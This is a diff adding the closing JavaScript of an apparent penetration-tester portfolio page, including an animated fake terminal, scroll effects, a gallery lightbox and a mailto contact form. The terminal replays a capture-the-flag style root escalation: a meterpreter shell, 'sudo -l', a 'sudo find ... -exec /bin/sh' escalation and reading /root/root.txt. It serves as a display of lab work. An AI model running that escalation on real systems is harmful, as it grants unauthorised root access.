+    { type:"cmd", text:"shell", prompt:"meterpreter >", wait:300 },
+    { type:"cmd", text:"id", prompt:"www-data@acme:/var/www/html$", wait:300 },
+    { type:"out", text:"uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
+    { type:"cmd", text:"sudo -l", prompt:"www-data@acme:/var/www/html$", wait:300 },
+    { type:"out", text:"User www-data may run the following commands on acme:" },
+    { type:"out", cls:"warn", text:"    (ALL : ALL) NOPASSWD: /usr/bin/find" },
+    { type:"cmd", text:"sudo find . -exec /bin/sh \\; -quit", prompt:"www-data@acme:/var/www/html$", wait:350 },
+    { type:"cmd", text:"id", prompt:"#", wait:250 },
+    { type:"out", cls:"ok", text:"uid=0(root) gid=0(root) groups=0(root)" },
+    { type:"gap" },
+    { type:"cmd", text:"cat /root/root.txt", prompt:"#", wait:300 },
+    { type:"out", cls:"flag", text:"THM{r00t_0n_4cm3_c0rp_2026}" },
+    { type:"out", cls:"accent", text:"[✓] ENGAGEMENT COMPLETE — privileges escalated, flag captured" }
+  ];
+
+  const body    = document.getElementById("termBody");
+  const replay  = document.getElementById("termReplay");
+  const status  = document.getElementById("termStatus");
+  let running   = false;
+
+  /* Type a command character by character */
+  async function typeCommand(el, text, speed = 15){
+    for (const ch of text){
+      el.textContent += ch;
+      body.scrollTop = body.scrollHeight;
+      await sleep(speed);
+    }
+  }
+
+  /* Append the blinking prompt after the run finishes */
+  function finishLine(){
+    const line = document.createElement("div");
+    line.className = "t-line";
+    const prompt = document.createElement("span");
+    prompt.className = "t-prompt";
+    prompt.textContent = "└─# ";
+    const blink = document.createElement("span");
+    blink.className = "cursor";
+    blink.textContent = "\u00a0";
+    line.append(prompt, blink);
+    body.appendChild(line);
+    body.scrollTop = body.scrollHeight;
+  }
+
+  async function run(){
+    if (running) return;
+    running = true;
+    replay.disabled = true;
+    body.innerHTML = "";
+    status.textContent = "[ running engagement... ]";
+
+    for (const step of script){
+
+      if (step.type === "gap"){
+        const gap = document.createElement("div");
+        gap.className = "t-gap";
+        body.appendChild(gap);
+        await sleep(180);
+        continue;
+      }
+
+      const line = document.createElement("div");
+
+      if (step.type === "cmd"){
+        line.className = "t-line";
+
+        const prompt = document.createElement("span");
+        prompt.className = "t-prompt";
+        prompt.textContent = (step.prompt || "└─# ") + " ";
+
+        const cmd = document.createElement("span");
+        cmd.className = "t-cmd";
+
+        line.append(prompt, cmd);
+        body.appendChild(line);
+        body.scrollTop = body.scrollHeight;
+
+        await typeCommand(cmd, step.text);
+        await sleep(step.wait || 250);
+
+      } else {
+        line.className = "t-line " + (step.cls || "");
+        line.textContent = step.text;
+        body.appendChild(line);
+        body.scrollTop = body.scrollHeight;
+        await sleep(70);
+      }
+    }
+
+    finishLine();
+    status.textContent = "[ engagement complete ]";
+    running = false;
+    replay.disabled = false;
+  }
+
+  replay.addEventListener("click", run);
+
+  /* Start automatically the first time the terminal scrolls into view */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting){
+        run();
+        observer.disconnect();
+      }
+    });
+  }, { threshold: 0.25 });
+
+  observer.observe(document.querySelector(".terminal"));
+})();
+
+/* =========================================================
+   4. SCROLL REVEAL + ANIMATED BARS & COUNTERS
+   ========================================================= */
+(function scrollEffects(){
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (!entry.isIntersecting) return;
+      const el = entry.target;
+      el.classList.add("visible");
+
+      el.querySelectorAll(".bar i").forEach(bar => {
+        bar.style.width = bar.dataset.w + "%";
+      });
+
+      el.querySelectorAll("[data-count]").forEach(counter => {
+        const end = Number(counter.dataset.count);
+        let value = 0;
+        const step = Math.max(1, Math.round(end / 40));
+        const timer = setInterval(() => {
+          value += step;
+          if (value >= end){ value = end; clearInterval(timer); }
+          counter.textContent = value + "+";
+        }, 30);
+      });
+
+      observer.unobserve(el);
+    });
+  }, { threshold: 0.15 });
+
+  document.querySelectorAll(".reveal").forEach(el => observer.observe(el));
+})();
+
+/* =========================================================
+   5. ACTIVE NAV HIGHLIGHTING
+   ========================================================= */
+(function activeNav(){
+  const sections = document.querySelectorAll("section[id]");
+  const links    = document.querySelectorAll("#navLinks a");
+
+  window.addEventListener("scroll", () => {
+    let current = "";
+    sections.forEach(sec => {
+      if (window.scrollY >= sec.offsetTop - 140) current = sec.id;
+    });
+    links.forEach(a =>
+      a.classList.toggle("active", a.getAttribute("href") === "#" + current)
+    );
+  }, { passive:true });
+})();
+
+/* =========================================================
+   6. GALLERY LIGHTBOX
+   ========================================================= */
+(function galleryLightbox(){
+  const box = document.createElement("div");
+  box.id = "lightbox";
+  box.innerHTML = '<button class="close">[ x ] close</button><img src="" alt=""><p></p>';
+  document.body.appendChild(box);
+
+  const boxImg = box.querySelector("img");
+  const boxCap = box.querySelector("p");
+
+  document.querySelectorAll(".gal-item").forEach(item => {
+    item.addEventListener("click", () => {
+      boxImg.src = item.querySelector("img").src;
+      boxImg.alt = item.querySelector("img").alt;
+      boxCap.textContent = item.dataset.caption || "";
+      box.classList.add("open");
+    });
+  });
+
+  box.addEventListener("click", e => {
+    if (e.target !== boxImg) box.classList.remove("open");
+  });
+
+  document.addEventListener("keydown", e => {
+    if (e.key === "Escape") box.classList.remove("open");
+  });
+})();
+
+/* =========================================================
+   7. CONTACT FORM → MAILTO FALLBACK
+   ========================================================= */
+(function contactForm(){
+  const form    = document.getElementById("contactForm");
+  const message = document.getElementById("formMsg");
+
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+    const body = encodeURIComponent(
+      `Name: ${form.name.value}\nEmail: ${form.email.value}\n\n${form.message.value}`
+    );
+    message.style.display = "block";
+    setTimeout(() => {
+      window.location.href = `mailto:${EMAIL}?subject=Portfolio Contact — ${form.name.value}&body=${body}`;
+    }, 700);
+  });
+})();
+</script>
+</body>
+</html>
